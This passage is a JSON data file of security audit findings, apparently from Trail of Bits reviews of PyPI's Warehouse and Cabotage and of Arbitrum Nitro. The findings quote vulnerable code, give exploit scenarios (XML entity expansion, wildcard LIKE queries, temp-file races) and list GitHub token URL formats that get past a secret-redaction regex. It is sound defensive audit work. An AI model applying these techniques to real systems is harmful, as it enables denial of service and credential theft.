            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "21. Brittle X.509 certicate rewriting ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotage uses Vault as a signing interface. To produce X.509 certicates with signatures from keys that are held by Vault, Cabotage creates a dummy certicate with a discarded private key, and then re-signs the tbsCertificate component using Vaults signing interface. It then squishes the new Vault-created signature into the pre-existing X.509 certicate through a certificate_squisher helper: def certificate_squisher (cert, signature): \"\"\"A kind courtesy of @reaperhulk Function assumes cert is a parsed cryptography x509 cert and that the new signature is of the same type as the one being replaced. Returns a DER encoded certificate. \"\"\" cert_bytes = bytearray (cert.public_bytes(serialization.Encoding.DER)) # Fix the BITSTRING length cert_bytes[- len (cert.signature) - 2 ] = len (signature) + 1 # Fix the SEQUENCE length cert_bytes[ 3 ] += len (signature) - len (cert.signature) return bytes (cert_bytes)[:- len (cert.signature)] + signature def construct_cert_from_public_key (signer, public_key_pem, common_name): dummy_cert = issue_dummy_cert(public_key_pem, common_name) bytes_to_sign = dummy_cert.tbs_certificate_bytes payload = base64.b64encode(bytes_to_sign).decode() signature_bytes = signer(payload) final_certificate_bytes = certificate_squisher(dummy_cert, signature_bytes) final_cert = x509.load_der_x509_certificate( final_certificate_bytes, backend=default_backend(), ) return final_cert.public_bytes( encoding=serialization.Encoding.PEM, ).decode() Figure 21.1: Certicate rewriting and squishing ( cabotage-app/cabotage/utils/cert_hacks.py#4775 ) In most circumstances, this will work correctly (as the new signature will be very close in length to the old dummy signature). However, it is fundamentally brittle: while the signatures own lengths are updated, the DER length encoding is itself variable length and remains unchanged. As a result, an unexpectedly large or small signature here may require a larger or smaller length eld encoding that goes unchanged, meaning that certificate_squisher will silently produce an invalid X.509 certicate. This invalid certicate is then ultimately surfaced, among other places, via the /signing-cert endpoint: @user_blueprint .route( '/signing-cert' , methods=[ 'GET' ]) def signing_cert (): cert = vault.signing_cert raw = request.args.get( \"raw\" , None ) if raw is not None : response = make_response(cert, 200 ) response.mimetype = \"text/plain\" return response return render_template( 'user/signing_cert.html' , signing_certificate=cert) Figure 21.2: The /signing-cert endpoint ( cabotage-app/cabotage/server/user/views.py#12031211 ) Consequently, users of Cabotage may be served an invalid X.509 certicate, producing error states that are not immediately resolvable by either Cabotages operators or clients who rely on it. Exploit Scenario This is an informational nding; an attacker who manages to induce the broken length case will be able to grief users of Cabotage by serving an invalid signing certicate, but otherwise the attacker lacks any useful control over the signing certicates contents. Recommendations We recommend that Cabotage implement the PyCA Cryptography librarys private key interface to perform the signing operation here, allowing the Vault-based signer to transparently interoperate with Cryptographys ordinary X.509 APIs. This interface was not available at the time Cabotage initially added its certicate handling (circa 2017) but has since been stabilized; an example of it can be found at reaperhulk/vault-signing .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "22. Unused dependencies in Cabotage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotages runtime Python dependencies are specied in the top-level requirements.txt le. During a review of Cabotages build and external dependencies, we identied multiple dependencies that are specied but appear to be unused anywhere in Cabotages codebase. These unused dependencies include (but are not limited to):        amqp asn1crypto distlib Babel billard blinker cachetools Some of these unused dependencies may be transitive dependencies, but an absence of hashing in the requirements.txt le indicates that these transitive dependencies are not currently being tracked systematically. Exploit Scenario Python dependencies, when installed as source distributions, are capable of executing arbitrary code at install time. Consequently, an attacker who compromises a dependency of Cabotage may be able to execute arbitrary code in Cabotages build or setup stages, compromising an entire deployment (and all applications hosted within that deployment). Arbitrary code execution during source distribution is an intended feature of the Python packaging ecosystem, so we do not consider it itself to be a security vulnerability; instead, we note that unused dependencies represent an unnecessary increase in Cabotages footprint, giving a potential attacker more attack surface than strictly necessary. This nding is purely informational, as there is no indication that any of the currently unused dependencies specied by Cabotage are malicious. Recommendations We recommend that Cabotages maintainers conduct a review of all dependencies currently listed in requirements.txt and remove all that are not currently required by Cabotage. Moreover, we recommend that Cabotage employ a dependency freezing and hashing tool like pip-compile to maintain a hermetic, fully resolved requirements le.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "23. Insecure XML processing in XMLRPC server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse exposes an XMLRPC server that can be used to query certain package information. This server is implemented using the xmlrpc package, which is not secure against erroneous or maliciously constructed data. An attacker can craft a request that exploits known weaknesses in the XML parser to cause high CPU and memory consumption, leading to a denial of service. The Python website warns about several issues that can aect the xmlrpc.server module, including exponential entity expansion, quadratic blowup entity expansion, and decompression bombs. The impact of this issue on PyPI would be limited, due to Warehouses deployment architecture. Exploit Scenario An attacker uses the code in appendix D to send a malicious billion laughs XMLRPC request to a Warehouse instance. The Warehouse worker handling the request starts to consume all available memory and signicant amounts of CPU time, and gets killed when the system runs out of memory. Recommendations Short term, ensure that the version of Expat used by Warehouse is 2.4.1 or newer; Pythons ocial documentation notes that versions 2.4.1 and later are not susceptible to billion laughs or quadratic blowup attacks. If a suciently new version of Expat cannot be used, we recommend using the defusedxml package to prevent potentially malicious operations. However, combining the two should not be necessary. Long term, consider deprecating the XMLRPC server in favor of REST APIs. References  XML Processing Modules - XML Vulnerabilities, Python documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "24. Missing resource integrity check of third-party resources ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Several publicly hosted scripts and stylesheets are embedded in the project_application_shell view via <script> and <link> tags. However, these script elements do not contain the integrity attribute. This Subresource Integrity (SRI) feature enables a browser to verify that the linked resources have not been manipulated by an attacker (e.g., one with access to the server hosting the scripts or stylesheets). {% block styles %} {{ super() }} < link rel= \"stylesheet\" href= \"https://cdn.jsdelivr.net/npm/xterm@5.1.0/css/xterm.min.css\" /> {% endblock %} {% block scripts %} < script src= \"https://cdn.jsdelivr.net/npm/xterm@5.1.0/lib/xterm.min.js\" ></ script > < script src= \"https://cdn.jsdelivr.net/npm/xterm-addon-attach@5.0.0-beta.2/lib/xterm-addon-at tach.js\" ></ script > < script src= \"https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.7.0/lib/xterm-addon-fit.min.js\" > </ script > {% endblock %} Figure 24.1: Scripts and stylesheets without integrity hashes ( cabotage-app/cabotage/client/templates/user/project_application_shell.ht ml#211 ) This issue has informational severity, as this view is not enabled by default. Exploit Scenario An attacker compromises the jsDelivr content delivery network and serves a malicious xterm.min.js script. When a Cabotage user interacts with the project_application_shell view, the browser loads and executes the malicious script without checking its integrity. Recommendations Short term, review the codebase for any instances in which the front end loads scripts and stylesheets hosted by third parties and add SRI hashes to those elements. Long term, use static analysis tools such as Semgrep to detect similar issues during the development process. References  Subresource Integrity information, MDN Web Docs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Brittle secret ltering in logs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotage uses a filter_secrets helper to redact secret values, particularly GitHub access tokens appearing in username:password format with x-access-token as the username. def filter_secrets (string): return re.sub( 'x-access-token:.+@github.com' , 'github.com' , string) Figure 25.1: The filter_secrets helper ( cabotage-app/cabotage/utils/logs.py#34 ) However, GitHub is somewhat exible about the structure of access tokens in URLs intended for git access. In particular, each of the following works (where $TOKEN is an access token):  hxxps://$TOKEN@github.com/user/repo.git  hxxps://arbitrary-string-here:$TOKEN@github.com/user/repo.git  hxxps://$TOKEN:x-oauth-basic@github.com/user/repo.git This list is not necessarily exhaustive; other credential formats may be accepted by GitHub. As a result of this exibility, a user or hosted application that makes use of GitHub access tokens in git URLs may have its tokens inadvertently leaked through Cabotages logging facilities. Exploit Scenario An attacker with the ability to monitor logs may observe unredacted GitHub credentials that do not match the current pattern, and may be able to use those credentials to perform unintended GitHub operations (and transitively pivot to a higher privilege on the Cabotage instance). Recommendations We recommend that Cabotage expand the GitHub URL pattern used to scan for secrets, to include anything that appears to have a credentials component. One potential replacement pattern is the following: def filter_secrets (string): return re.sub( '\\S+@github.com' , 'github.com' , string) Figure 25.2: A potential stricter filter_secrets helper This will eectively erase all non-whitespace characters in the authentication component of th e URL, at the small cost of potentially erasing some leading protocol metadata as well (such as https:// ), if present. Alternatively, if Cabotage is able to assert that all tokens used by hosted applications conrm to GitHubs new authentication token formats , Cabotage may choose instead to match on the well-known prexes that GitHub advertises: ghp , gho , ghu , ghs , and ghr . We note, however, that GitHub may choose to expand the list of valid prexes at any point, making this pattern potentially leaky over time. As such, we recommend the previous approach. More generally, we recommend that Cabotage conduct a review of other token formats or sensitive strings that may be leaked through its logging facility. Because the facility appears to be generic and applicable to arbitrary applications deployed through Cabotage, there may not be a generalizable pattern Cabotage can apply; in this case, we recommend that Cabotage expose a facility through which users can specify strings or patterns that should be redacted in their own deployment logs.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "26. Routes missing access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotage uses Flask-Login to manage user sessions. Flask-Login provides a @login_required decorator that prevents unauthenticated users from accessing views. Most Cabotage views are protected with this decorator, with the exception of release_build_context_tarfile . @user_blueprint .route( '/release/<release_id>/context.tar.gz' ) def release_build_context_tarfile (release_id): 870 871 872 release = Release.query.filter_by( id =release_id).first() 873 874 abort( 404 ) 875 return send_file(release.release_build_context_tarfile, if release is None : as_attachment= True , download_name= f 'context.tar.gz' ) Figure 26.1: The release_build_context_tarfile view ( cabotage-app/cabotage/server/user/views.py#870875 ) Additionally, release_build_context_tarfile does not check if the current user is authorized to access the application associated with the release. As a result, any user with the release ID is able to download the build context associated with the release. Exploit Scenario A Cabotage user leaks a URL containing a release ID to the public, which an attacker then uses to access the /release/<release_id>/context.tar.gz endpoint. The attacker then gains non-public information (e.g., environment variables) about the application from this build context. Recommendations We recommend that Cabotage protects this view with @login_required and ViewApplicationPermission , as is already done for other release views.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. Denial-of-service risk on tar.gz uploads ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse allows users to upload source distributions to the system. These source distributions are uploaded as .tar.gz archives. As part of upload-time metadata validation the archive is decompressed. Because .tar.gz archives can be manipulated to exhibit high compression ratios, this decompression operation may result in high CPU usage on a Warehouse web worker. This is documented in a comment in the code. if filename.endswith( \".tar.gz\" ): # TODO: Ideally Ensure the compression ratio is not absurd # (decompression bomb), like we do for wheel/zip above. # Ensure that this is a valid tar file, and that it contains PKG-INFO. try : with tarfile.open(filename, \"r:gz\" ) as tar: # This decompresses the entire stream to validate it and the # tar within. Easy CPU DoS attack. :/ bad_tar = True member = tar.next() while member: parts = os.path.split(member.name) if len (parts) == 2 and parts[ 1 ] == \"PKG-INFO\" : bad_tar = False member = tar.next() if bad_tar: return False except (tarfile.ReadError, EOFError ): return False Figure 27.1: The stream is decompressed fully, which may cause high CPU usage ( warehouse/warehouse/forklift/legacy.py#694713 ) Like other resource-based denials of services, this is largely mitigated by Warehouses deployment architecture. Consequently, we consider this nding to have informational severity. Exploit Scenario An attacker crafts a relatively small . tar.gz archive with a very high compression ratio and uploads it to Warehouse. The Warehouse web worker handling the upload request decompresses the archive in a streaming fashion while searching for metadata, resulting in high CPU usage until the task either times out or decompression completes. An attacker may upload multiple release distributions in parallel, impeding availability of the upload endpoint for other users. Recommendations This is an informational nding; due to the challenges associated with calculating a zlib streams compression ratio, we make no recommendations around doing so. Long term, we recommend that Warehouse evaluate suitable external memory and CPU time limits on an isolated decompression task via a system interface like setrlimit .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "28. Deployment hook susceptible to race condition due to temporary les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotages process_deployment_hook uses temporary intermediate les to process the contents of the GitHub repository tarball. These les are opened two times in a pattern: a rst open is used to write some contents to the le, then a second open is done to consume those contents for a dierent purpose. An attacker with lesystem access may replace the github_tarball_path le in the lesystem between the two open(...) calls to cause Warehouse to silently operate with a tampered tarball. Likewise, they may replace the release_tarball_path while it is being written to cause Cabotage to upload a dierent le to MinIO. github_tarball_fd, github_tarball_path = tempfile.mkstemp() release_tarball_fd, release_tarball_path = tempfile.mkstemp() try : print ( 'rewriting tarfile... for reasons' ) with open (github_tarball_path, 'wb' ) as handle: for chunk in tarball_request.iter_content( 4096 ): handle.write(chunk) with tarfile.open(github_tarball_path, 'r' ) as github_tarfile: with tarfile.open(release_tarball_path, 'w|gz' ) as release_tarfile: for member in github_tarfile: tar_info = member tar_info.name = f './ { str (Path(*Path(member.name).parts[ 1 :])) } ' release_tarfile.addfile( tar_info, github_tarfile.extractfile(member) ) print ( 'uploading tar to minio' ) with open (release_tarball_path, 'rb' ) as handle: minio_response = minio.write_object(application.project.organization.slug, application.project.slug, application.slug, handle) print ( f 'uploaded tar to { minio_response[ \"path\" ] } ' ) Figure 28.1: The les are opened multiple times ( cabotage-app/cabotage/celery/tasks/github.py#105124 ) This nding is informational; an attacker with the ability to monitor temporary le directories and mount this attack is likely to have other lateral and horizontal capabilities. This nding and associated recommendations are presented as part of a defense-in-depth strategy. Exploit Scenario An attacker with the ability to monitor temporary les observes that Warehouse has created a new temporary le and is writing a tarball. She moves a new tarball le to the path after Warehouse creates the le and while it is writing the tarball contents. Warehouse then reopens the le and starts reading from it, consuming the attacker les contents instead of the expected data. Recommendations Short term, consider if rewriting the tarball is still necessary. If it is still needed, refactor process_deployment_hook to avoid using a named le (similarly to the recommendations for TOB-PYPI-11 ), and instead prefer tarfile.open(fileobj=...) combined with: 1. 2. An in-memory buer (such as a bytes or memoryview ) with suitable wrapping; An open le handle or descriptor (such as a le-like object like TemporaryFile or SpooledTemporaryFile ). Option (1) will entirely mitigate the risk, at the cost of potentially unacceptable memory usage. Option (2) will either partially or entirely mitigate the risk, depending on the execution environment and whether the temporary le is accessible from outside Warehouses process with a lename.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Unescaped values in LIKE SQL queries ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse uses the LIKE, ILIKE, and related operators (such as the startswith operator ) to let users query data in the database. User-provided input is used in these queries but it is not escaped. An attacker may include wildcard characters ( % ) in the user-provided values to produce unexpected query results, and potentially cause higher resource usage on the database server. Some of the aected routes include:  accounts.search  admin.emails.list  admin.helpscout  admin.journals.list  admin.organization.list  admin.organization_application.list  admin.prohibited_project_names.list  admin.project.releases  admin.user.list For example, accounts.search lets the public query account names in PyPI; this is used for autocomplete functionality. However, the user-provided text is included on a query with startswith(...) , which is translated by SQLAlchemy to a SQL LIKE query. If the user input contains % symbols, they will be treated as wildcards by the database server. @functools .lru_cache def get_users_by_prefix ( self , prefix: str ) -> list [User]: \"\"\" Get the first 10 matches by username prefix. No need to apply `ILIKE` here, as the `username` column is already `CIText`. \"\"\" return ( self .db.query(User) .filter( User.username.startswith(prefix) ) .order_by(User.username) .limit( 10 ) .all() ) Figure 29.1: The usernames are looked up with startswith ( warehouse/warehouse/accounts/services.py#123137 ) This issue has informational severity as the aected routes we found are either admin routes or have rate-limiting implemented in them. Exploit Scenario An attacker repeatedly queries /accounts/search/?q=%25a%25a on a Warehouse instance. Warehouse queries the users table on the database for username LIKE %a%a% and causes performance degradation on the database server. Recommendations Short term, properly escape all user input that ows to ilike(...) , like(...) , and variants such as startswith(...) . Some of these functions have an autoescape parameter that may be used to this eect. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. secp256r1 precompile does not check for signature malleability ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf",
        "body": "The implementation of the ecdsa.Verify function from the secp256r1 package is vulnerable to signature malleability attacks. This issue arises from the fact that the function accepts malleable signatures as valid inputs: // Verifies the given signature (r, s) for the given hash and public key (x, y). func Verify(hash []byte, r, s, x, y *big.Int) bool { // Create the public key format publicKey := newPublicKey(x, y) // Check if they are invalid public key coordinates if publicKey == nil { return false } // Verify the signature with the public key, // then return true if it's valid, false otherwise return ecdsa.Verify(publicKey, hash, r, s) } Figure 1.1: secp256r1s ecdsa.Verify function accepts malleable signatures (go-ethereum/crypto/secp256r1/verifier.go#821) Signature malleability refers to the ability to modify a valid signature without invalidating it, which can lead to potential security risks. Accepting multiple values for the components of the signature allows an attacker to create a dierent valid signature for the same message, potentially causing issues in systems that rely on unique signatures. While the standard species this as the expected behavior, users need to be very aware of this, since malleable signatures have produced many security incidents in the past. Wrapper libraries SHOULD add a malleability check by default, with functions wrapping the raw precompile call (exact NIST FIPS 186-5 spec, without malleability check) clearly identified. For example, P256.verifySignature and P256.verifySignatureWithoutMalleabilityCheck. Adding the malleability check is straightforward and costs minimal gas. Figure 1.2: Part of the RIP-7212 standard Recommendations Short term, properly document this behavior to ensure that users are aware of the implications of calling this precompile. Consider recommending a wrapper library that performs malleability checks (e.g., something similar to the OpenZeppelin code). Long term, review the usage of Ethereum/Rollup standards across the codebase to identify potential misuse of them by users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. secp256r1 precompile uses a deprecated function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf",
        "body": "The public key validation depends on the IsOnCurve primitive, which was recently deprecated in golang 1.21. The current implementation of the secp256r1 precompile veries that the values provided are part of the relevant elliptic curve: func newPublicKey(x, y *big.Int) *ecdsa.PublicKey { // Check if the given coordinates are valid if x == nil || y == nil || !elliptic.P256().IsOnCurve(x, y) { return nil }  } Figure 2.1: Header of the newPublicKey function However, the latest version of the IsOnCurve function contains a deprecation note: // IsOnCurve reports whether the given (x,y) lies on the curve. // // Deprecated: this is a low-level unsafe API. For ECDH, use the crypto/ecdh // package. The NewPublicKey methods of NIST curves in crypto/ecdh accept // the same encoding as the Unmarshal function, and perform on-curve checks. IsOnCurve(x, y *big.Int) bool Figure 2.2: Deprecated comment on the IsOnCurve method Recommendations Short term, document usage of a deprecated method in the precompile code and documentation. Long term, review the usage of deprecated API across the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Incorrect implementation of integer math functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf",
        "body": "Several math functions for integer values are implemented incorrectly and do not handle overow cases. The AbsValue function allows overow to occur for minimum integer values and does not panic. func AbsValue[T Ordered](value T) T { if value < 0 { return -value // never happens for unsigned types } return value } Figure 3.1: The AbsValue function implementation for generic Ordered types (nitro/util/arbmath/math.go#7783) The SaturatingAdd function returns incorrect values when reaching saturation. The positive case returns -1 instead of the expected maximum integer value. This is because the right-shift operator >> implements a signed arithmetic shift for integer types. In a similar manner, the negative case returns 0 instead of the minimum integer value. // SaturatingAdd add two integers without overflow func SaturatingAdd[T Signed](a, b T) T { sum := a + b if b > 0 && sum < a { sum = ^T(0) >> 1 } if b < 0 && sum > a { sum = (^T(0) >> 1) + 1 } return sum } Figure 3.2: The SaturatingAdd function implementation for generic Integer types (nitro/util/arbmath/math.go#270280) The SaturatingSub function does not handle overow in the subtrahend when it equals the minimum negative integer value. It further compounds the errors from the SaturatingAdd function. // SaturatingSub subtract an int64 from another without overflow func SaturatingSub(minuend, subtrahend int64) int64 { return SaturatingAdd(minuend, -subtrahend) } Figure 3.3: The SaturatingSub function implementation for generic integer types (nitro/util/arbmath/math.go#291294) The SaturatingMul function, similarly to the SaturatingAdd function, returns -1 for the positive saturating case and 0 for the negative case. // SaturatingMul multiply two integers without over/underflow func SaturatingMul[T Signed](a, b T) T { product := a * b if b != 0 && product/b != a { if (a > 0 && b > 0) || (a < 0 && b < 0) { product = ^T(0) >> 1 } else { product = (^T(0) >> 1) + 1 } } return product } Figure 3.4: The SaturatingMul function implementation for generic integer types (nitro/util/arbmath/math.go#313324) The SaturatingNeg function incorrectly checks for the case when the provided value equals -1 (^T(0)) instead of the minimum integer value. It further incorrectly returns -1 instead of the maximum value in the special case. // Negates an int without underflow func SaturatingNeg[T Signed](value T) T { if value == ^T(0) { return (^T(0)) >> 1 } return -value } Figure 3.5: The SaturatingNeg function implementation for generic integer types (nitro/util/arbmath/math.go#368374) The highlighted math functions are used in a few places throughout the codebase. For example, the SaturatingAdd function is used in internal_tx.go. gasSpent := arbmath.SaturatingAdd(perBatchGas, arbmath.SaturatingCast[int64](batchDataGas)) Figure 3.6: Gas spent computation during an internal transaction handling (nitro/arbos/internal_tx.go#107) The SaturatingMul and SaturatingSub function are both used in batch_poster.go. surplus := arbmath.SaturatingMul( arbmath.SaturatingSub( l1GasPriceGauge.Snapshot().Value(), l1GasPriceEstimateGauge.Snapshot().Value()), int64(len(sequencerMsg)*16), ) Figure 3.7: Surplus computation in batch poster (nitro/arbnode/batch_poster.go#13271332) The SaturatingSub function is used inside of the L2 pricing model in model.go. backlog = arbmath.SaturatingUCast[uint64](arbmath.SaturatingSub(int64(backlog), gas)) Figure 3.8: Backlog computation for the L2 pricing model (nitro/arbos/l2pricing/model.go#33) We further found that the SaturatingMul function is used in other parts of the arbmath package, such as the NaturalToBips and the PercentToBips functions. func NaturalToBips(natural int64) Bips { return Bips(SaturatingMul(natural, int64(OneInBips))) } func PercentToBips(percentage int64) Bips { return Bips(SaturatingMul(percentage, 100)) } Figure 3.9: Bips conversion functions used in the L2 pricing model (nitro/util/arbmath/bips.go#1218) The NaturalToBips function was also found to be used by the L2 pricing model. exponentBips := arbmath.NaturalToBips(excess) / arbmath.Bips(inertia*speedLimit) Figure 3.10: Exponential bips computation for the L2 pricing model (nitro/arbos/l2pricing/model.go#48) Exploit Scenario The following test cases showcase the unexpected errors in the integer math functions. func TestAbsValueIntOverflow(t *testing.T) { minValue := math.MinInt64 expected := minValue result := AbsValue(minValue) if result == expected { t.Errorf(\"AbsValue(%d) = %d; resulted in overflow\", minValue, result) } } func TestSaturatingAdd(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {2, 3, 5}, {-1, -2, -3}, {math.MaxInt64, 1, math.MaxInt64}, {math.MinInt64, -1, math.MinInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingAdd(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingAdd(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingSub(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {5, 3, 2}, {-3, -2, -1}, {math.MinInt64, 1, math.MinInt64}, {0, math.MinInt64, math.MaxInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingSub(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingSub(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingMul(t *testing.T) { tests := []struct { a, b, expected int64 }{ } {5, 3, 15}, {-3, -2, 6}, {math.MaxInt64, 2, math.MaxInt64}, {math.MinInt64, 2, math.MinInt64}, for _, tt := range tests { t.Run(\"\", func(t *testing.T) { sum := SaturatingMul(int64(tt.a), int64(tt.b)) if sum != tt.expected { t.Errorf(\"SaturatingMul(%v, %v) = %v; want %v\", tt.a, tt.b, sum, tt.expected) } }) } } func TestSaturatingNeg(t *testing.T) { tests := []struct { value int64 expected int64 }{ } {0, 0}, {5, -5}, {-5, 5}, {math.MinInt64, math.MaxInt64}, {math.MaxInt64, math.MinInt64}, for _, tc := range tests { t.Run(\"\", func(t *testing.T) { result := SaturatingNeg(tc.value) if result != tc.expected { t.Errorf(\"SaturatingNeg(%v) = %v: expected %v\", tc.value, result, tc.expected) } }) } } Figure 3.11: Additional arbmath test cases Running the test cases produces the following result. go test -timeout 30s github.com/offchainlabs/nitro/util/arbmath --- FAIL: TestAbsValueIntOverflow (0.00s) math_test.go:131: AbsValue(-9223372036854775808) = -9223372036854775808; resulted in overflow --- FAIL: TestSaturatingAdd (0.00s) --- FAIL: TestSaturatingAdd/#02 (0.00s) math_test.go:149: SaturatingAdd(9223372036854775807, 1) = -1; want 9223372036854775807 --- FAIL: TestSaturatingAdd/#03 (0.00s) math_test.go:149: SaturatingAdd(-9223372036854775808, -1) = 0; want -9223372036854775808 --- FAIL: TestSaturatingSub (0.00s) --- FAIL: TestSaturatingSub/#02 (0.00s) math_test.go:169: SaturatingSub(-9223372036854775808, 1) = 0; want -9223372036854775808 --- FAIL: TestSaturatingSub/#03 (0.00s) math_test.go:169: SaturatingSub(0, -9223372036854775808) = -9223372036854775808; want 9223372036854775807 --- FAIL: TestSaturatingMul (0.00s) --- FAIL: TestSaturatingMul/#02 (0.00s) math_test.go:189: SaturatingMul(9223372036854775807, 2) = -1; want 9223372036854775807 --- FAIL: TestSaturatingMul/#03 (0.00s) math_test.go:189: SaturatingMul(-9223372036854775808, 2) = 0; want -9223372036854775808 --- FAIL: TestSaturatingNeg (0.00s) --- FAIL: TestSaturatingNeg/#03 (0.00s) math_test.go:211: SaturatingNeg(-9223372036854775808) = -9223372036854775808: expected 9223372036854775807 --- FAIL: TestSaturatingNeg/#04 (0.00s) math_test.go:211: SaturatingNeg(9223372036854775807) = -9223372036854775807: expected -9223372036854775808 FAIL FAIL FAIL github.com/offchainlabs/nitro/util/arbmath 0.921s Figure 3.12: Test results Recommendations Short term, consider reverting the changes that allow for generic type implementations of the arbmath functions. Additionally, include unit tests that cover important edge cases. Alternatively (although we do not recommend the usage of the unsafe package), implement the correct integer math functions using helper functions MaxSignedValue and MinSignedValue. // MaxSignedValue returns the maximum value for a signed integer type T func MaxSignedValue[T Signed]() T { return T(1<<(8*unsafe.Sizeof(T(0))-1) - 1) } // MinSignedValue returns the minimum value for a signed integer type T func MinSignedValue[T Signed]() T { return T(1 << (8*unsafe.Sizeof(T(0)) - 1)) } Figure 3.13: The MaxSignedValue and MinSignedValue helper functions Return the maximum integer value in the case of a positive, and the minimum integer value in the case of a negative integer overow, for the SaturatingAdd and SaturatingMul functions. // SaturatingAdd adds two integers without overflow func SaturatingAdd[T Signed](a, b T) T { sum := a + b if b > 0 && sum < a { return MaxSignedValue[T]() } if b < 0 && sum > a { return MinSignedValue[T]() } return sum } Figure 3.14: The corrected SaturatingAdd function // SaturatingMul multiply two integers without over/underflow func SaturatingMul[T Signed](a, b T) T { product := a * b if b != 0 && product/b != a { if (a > 0 && b > 0) || (a < 0 && b < 0) { product = MaxSignedValue[T]() } else { product = MinSignedValue[T]() } } return product } Figure 3.15: The corrected SaturatingMul function The SaturatingSub function should be rewritten to properly handle the case when b equals the minimum integer value, as negating the value and reusing SaturatingAdd would result in an overow. // SaturatingSub subtracts two integers without overflow func SaturatingSub[T Signed](a, b T) T { diff := a - b if b < 0 && diff < a { return MaxSignedValue[T]() } if b > 0 && diff > a { return MinSignedValue[T]() } return diff } Figure 3.16: The corrected SaturatingSub function For the SaturatingNeg function, correct the value in the comparison by checking for the minimum integer value, and return the maximum integer value. // SaturatingNeg negates an integer without underflow func SaturatingNeg[T Signed](value T) T { if value == MinSignedValue[T]() { return MaxSignedValue[T]() } return -value } Figure 3.17: The corrected SaturatingNeg function For the AbsValue function, consider panicking in the case of an overow, or returning an error. // AbsValue returns the absolute value of a number func AbsValue[T Number](value T) T { if value < 0 { if value == MinSignedValue[T]() { panic(\"AbsValue: overflow detected for minimum signed value\") } return -value } return value } Figure 3.18: An AbsValue function which panics in the overow case Alternatively, consider implementing a SaturatingAbsValue function that clips the output to the maximum integer value. // SaturatingAbsValue returns the absolute value of a number func SaturatingAbsValue[T Number](value T) T { if value < 0 { if value == MinSignedValue[T]() { return MaxSignedValue[T]() } return -value } return value } Figure 3.19: An implementation of SaturatingAbsValue that saturates in the overow case Long term, implement unit tests covering the edge cases for the arbmath package. Further, consider fuzz testing, as this will help ensure more robust testing coverage. func FuzzSaturatingAdd(f *testing.F) { testCases := []struct { a, b int64 }{ } {2, 3}, {-1, -2}, {math.MaxInt64, 1}, {math.MinInt64, -1}, for _, tc := range testCases { f.Add(tc.a, tc.b) } f.Fuzz(func(t *testing.T, a, b int64) { sum := SaturatingAdd(a, b) expected := a + b if b > 0 && a > math.MaxInt64-b { expected = math.MaxInt64 } else if b < 0 && a < math.MinInt64-b { expected = math.MinInt64 } if sum != expected { t.Errorf(\"SaturatingAdd(%v, %v) = %v; want %v\", a, b, sum, expected) } }) } Figure 3.20: Example fuzz tests covering the SaturatingAdd function",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Incorrect parameter types used for CGo calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-arbos-30-nitro-upgrade-securityreview.pdf",
